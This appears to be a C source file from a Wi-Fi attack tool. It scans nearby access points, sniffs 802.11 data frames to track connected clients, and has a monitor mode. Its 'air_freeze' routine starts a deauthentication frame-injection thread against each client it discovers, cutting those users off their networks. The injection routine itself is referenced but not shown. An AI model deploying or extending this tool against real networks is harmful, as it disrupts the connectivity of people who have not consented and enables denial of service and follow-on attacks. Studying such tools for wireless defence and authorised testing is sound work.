#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "air_control.h"
#include "housekeeping.h"
#include "air_support.h"
#include "air_pollution.h"

#define FLUSH_PERIOD 600

struct wireless_scan *scan_local_aps(char *interface, char *scan_type) {

  int sockfd;
  struct iwreq scan_payload;
  struct wireless_scan_head event_head;
  struct iw_scan_req scan_options;
 
 
  sockfd = iw_sockets_open();
 
  memset(&scan_options, '\0', sizeof(struct iw_scan_req));

  if (scan_type != NULL && strcmp(scan_type, "passive") == 0)
     scan_options.scan_type = IW_SCAN_TYPE_PASSIVE;
  else
     scan_options.scan_type = IW_SCAN_TYPE_ACTIVE;

  scan_payload.u.data.pointer = (void *) &scan_options;
  scan_payload.u.data.flags = 0;
  scan_payload.u.data.length = sizeof(scan_options);
 
 
  if(iw_set_ext(sockfd, interface, SIOCSIWSCAN, &scan_payload) < 0) 
     perror_exit("Failed to initiate scan");
    
    
  puts("Listening in on beacon chatter of local access points...");
  sleep(30);
 
  event_head.retry = 1;
  event_head.result = NULL;
 
 
  if (iw_process_scan(sockfd, interface, WIRELESS_EXT, &event_head) < 0) 
      perror_exit("Failed to process scan results");
 
  iw_sockets_close(sockfd);
 
  if (event_head.result == NULL)
      bail_out("No access points in range!");
   
   
  return event_head.result;
        
}


struct con_info *find_wifi_sessions(const u_char *header_start, struct pkt_decode_opts *decode_res) {
      
  const struct ieee80211_radiotap_header *radio_h;
  const struct frame_ctl_section *frame_metadata;
  u_char empty_mac[] = { 0, 0, 0, 0, 0, 0 }, broadcast[] = { 255, 255, 255, 255, 255, 255};
        
         
  radio_h = (const struct ieee80211_radiotap_header *)header_start;
  frame_metadata = (const struct frame_ctl_section *)(header_start + radio_h->it_len);  
      
  if (frame_metadata->type == DATA_FRAME) {
      
     const struct ieee80211a_generic_frame *data_std_hdr = (const struct ieee80211a_generic_frame *)((const u_char *)frame_metadata + FRAME_CTL_LEN);     
      
     if (frame_metadata->to_ds == 1 && frame_metadata->from_ds == 0) {       
             
        if (memcmp(data_std_hdr->addr_1, empty_mac, ETH_ALEN) == 0
            || memcmp(data_std_hdr->addr_1, broadcast, ETH_ALEN) == 0
            || memcmp(data_std_hdr->addr_2, decode_res->local_mac, ETH_ALEN) == 0)
               return NULL;
             
        struct con_info *end_node = decode_res->framel_head;
        struct con_info *prev_node = end_node;
                 
        while (end_node != NULL) {

              if (memcmp(end_node->core_h.addr_2, data_std_hdr->addr_2, ETH_ALEN) == 0) 
                 return NULL;
                         
              prev_node = end_node;
              end_node = end_node->next;    

        }
              
        end_node = check_calloc(1,sizeof(struct con_info));
        end_node->core_h = *data_std_hdr;
                          
        decode_radiotap(header_start, end_node);             
                  
        if (frame_metadata->subtype & QOS_DATA)
           decode_qos(header_start + FRAME_CTL_LEN + sizeof(struct ieee80211a_generic_frame), end_node->qos_priority, sizeof(end_node->qos_priority)); 
        else   
           strncpy(end_node->qos_priority, "QS: -", sizeof(end_node->qos_priority));
                                
                                            
        if (decode_res->framel_head == NULL) 
           decode_res->framel_head = end_node;   
        else
           prev_node->next = end_node;
                
        decode_res->con_count++;    
        return end_node;
                                     
     }
         
  }

  return NULL;

}


void air_watch(u_char *session_args, const struct pcap_pkthdr *cap_header, const u_char *packet) {

  struct airloop_params *air_intel = (struct airloop_params *)session_args;
  struct con_info *tail_frame;
  time_t current_time = time(NULL);
  double time_frame = difftime(current_time, air_intel->start_time);
  static int contrack;


  pthread_mutex_lock(air_intel->term_mx);
    
    if (termflag)
       pcap_breakloop(main_devhandle);

  pthread_mutex_unlock(air_intel->term_mx);
 

  tail_frame = find_wifi_sessions(packet, air_intel->decode_options);

  if (air_intel->decode_options->con_count > air_intel->max_contrack || time_frame >= FLUSH_PERIOD) {
        
      free_list(&air_intel->decode_options->framel_head, PACKET_DATA);
      air_intel->decode_options->con_count = 0;
      air_intel->start_time = time(NULL);
      contrack = 0;
        
      puts(">>>>>>> Flushing track record <<<<<<<");
        
  }   

  
  if (air_intel->decode_options->con_count > contrack && tail_frame != NULL) {

      display_connection(air_intel->ap_list, tail_frame);    
      contrack = air_intel->decode_options->con_count;
  }     
   
}


void air_freeze(u_char *session_args, const struct pcap_pkthdr *cap_header, const u_char *packet) {

  struct airloop_params *air_intel = (struct airloop_params *)session_args;
  struct con_info *tail_frame;
  struct frame_thrower *bombard;
  static int contrack;

 
  pthread_mutex_lock(air_intel->term_mx);
    
    if (termflag)
       pcap_breakloop(main_devhandle);

  pthread_mutex_unlock(air_intel->term_mx);


  if (air_intel->decode_options->con_count < air_intel->max_contrack) {

      tail_frame = find_wifi_sessions(packet, air_intel->decode_options);
 

      if (air_intel->decode_options->con_count > contrack && tail_frame != NULL) {
 
	  puts(">>>>>>> Blocking: ");
          display_connection(air_intel->ap_list, tail_frame);   
          bombard = calloc(1, sizeof(struct frame_thrower));

	  if (bombard == NULL) {
             
	     perror("Failed to allocate injection thread resources");

             pthread_mutex_lock(air_intel->term_mx);
	       termflag = 1;
             pthread_mutex_unlock(air_intel->term_mx);

	     return;

	  }


          memcpy(bombard->client, tail_frame->core_h.addr_2, ETH_ALEN);
          memcpy(bombard->bssid, tail_frame->core_h.addr_1, ETH_ALEN);
          bombard->dev_name = air_intel->wifi_dev_name;
	  bombard->term_mx = air_intel->term_mx;
	  bombard->pcap_mx = air_intel->pcap_mx;

          int err = pthread_create(&bombard->thr_id, NULL, deauth_frame_inject_thr, bombard);
          if (err != 0) {
         
             thr_err_msg("Thread creation failed", err);

             pthread_mutex_lock(air_intel->term_mx);
	       termflag = 1;
             pthread_mutex_unlock(air_intel->term_mx);

          }       

          contrack = air_intel->decode_options->con_count;

          if (air_intel->attackers == NULL)
             air_intel->attackers = bombard;
	  else {

	     bombard->next = air_intel->attackers;
	     air_intel->attackers = bombard;
	  }
     
      }

  }

}

